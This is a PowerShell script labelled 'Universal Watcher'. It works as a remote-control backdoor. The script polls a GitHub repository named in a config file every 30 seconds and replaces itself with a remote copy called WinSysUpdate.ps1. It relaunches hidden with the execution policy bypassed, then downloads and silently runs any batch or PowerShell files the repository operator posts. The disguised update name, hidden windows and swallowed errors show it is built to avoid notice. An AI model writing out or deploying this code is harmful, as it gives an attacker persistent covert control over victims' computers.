# --- UNIVERSAL WATCHER ---
$dir = Split-Path $MyInvocation.MyCommand.Path
$configFile = Join-Path $dir "config.txt"

if (Test-Path $configFile) {
    $conf = Get-Content $configFile
    $user = $conf[0].Trim()
    $repo = $conf[1].Trim()
    $url = "https://raw.githubusercontent.com/$user/$repo/main"
} else { exit }

while($true) {
    try {
        # Self-Update
        $remote = Invoke-WebRequest -Uri "$url/WinSysUpdate.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
        if ($remote -and $remote -ne (Get-Content $MyInvocation.MyCommand.Path -Raw)) {
            Set-Content -Path $MyInvocation.MyCommand.Path -Value $remote
            Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -WindowStyle Hidden
            exit
        }
        # Check Commands
        $files = Invoke-RestMethod -Uri "https://api.github.com/repos/$user/$repo/contents/"
        foreach ($f in $files) {
            $n = $f.name
            $u = $f.download_url
            if ($n -like "create_*") {
                $c = Invoke-WebRequest -Uri $u -UseBasicParsing | Select-Object -ExpandProperty Content
                Set-Content -Path (Join-Path $dir ($n -replace "create_","")) -Value $c
            }
            if ($n -like "run_*") {
                $p = Join-Path $dir $n
                Invoke-WebRequest -Uri $u -OutFile $p
                if ($n -like "*.bat") { Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden }
                elseif ($n -like "*.ps1") { Start-Process powershell -ArgumentList "-File `"$p`"" -WindowStyle Hidden }
            }
        }
    } catch { }
    Start-Sleep -Seconds 30
}
